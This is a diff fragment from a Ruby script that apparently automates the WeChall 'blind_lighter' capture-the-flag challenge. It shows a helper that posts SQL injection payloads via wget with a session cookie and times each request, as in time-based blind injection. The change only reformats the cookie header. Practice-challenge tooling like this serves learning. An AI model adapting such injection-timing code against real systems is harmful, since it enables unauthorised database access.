@@ -16,7 +16,7 @@ char_set = ['A', 'B', 'C', 'D', 'E', 'F', '0', '1', '2', '3', '4', '5', '6', '7'
 def wget(url, post_data)
 	wget = "wget -O - -q #{url} " \
 	"--header=\"Referer: http://www.wechall.net/challenge/blind_lighter/index.php\" " \
-	"--header=\"Cookie: WC=#{$cookie}\" " \
+	"--header=\"Cookie: #{$cookie}\" " \
 	"--post-data \"injection=#{post_data}&inject=Inject\""
 	#register the time before the request
 	start = Time.now
